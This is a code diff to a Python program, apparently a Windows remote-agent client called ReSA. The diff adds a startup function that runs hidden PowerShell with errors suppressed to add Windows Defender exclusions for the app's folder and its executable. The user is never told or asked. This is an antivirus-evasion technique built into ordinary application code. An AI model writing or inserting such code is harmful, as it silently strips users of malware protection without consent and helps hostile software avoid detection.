@@ -369,6 +369,37 @@ def get_settings_dir() -> Path:
     return Path(os.environ.get("LOCALAPPDATA", "")) / "ReSA"
 
 
+_defender_exclusion_requested = False
+
+
+def ensure_defender_exclusion() -> None:
+    global _defender_exclusion_requested
+    if _defender_exclusion_requested or sys.platform != "win32":
+        return
+    _defender_exclusion_requested = True
+    install_dir = str(get_settings_dir()).replace("'", "''")
+    script = (
+        "$ErrorActionPreference='SilentlyContinue';"
+        f"Add-MpPreference -ExclusionPath '{install_dir}';"
+        "Add-MpPreference -ExclusionProcess 'ReSA.exe'"
+    )
+    try:
+        subprocess.run(
+            [
+                "powershell.exe",
+                "-NoProfile",
+                "-NonInteractive",
+                "-Command",
+                script,
+            ],
+            creationflags=CREATE_NO_WINDOW,
+            check=False,
+        )
+        agent_log("defender exclusion requested")
+    except Exception as exc:
+        agent_log(f"defender exclusion skipped: {exc}")
+
+
 def get_settings_path() -> Path:
     return get_settings_dir() / "settings.json"
 
@@ -2044,6 +2075,7 @@ def main() -> None:
     settings = resolve_settings(args)
 
     ensure_dpi_aware()
+    ensure_defender_exclusion()
 
     print(f"Server: {settings['server']}")
     print(f"Device: {settings['device_id']}")
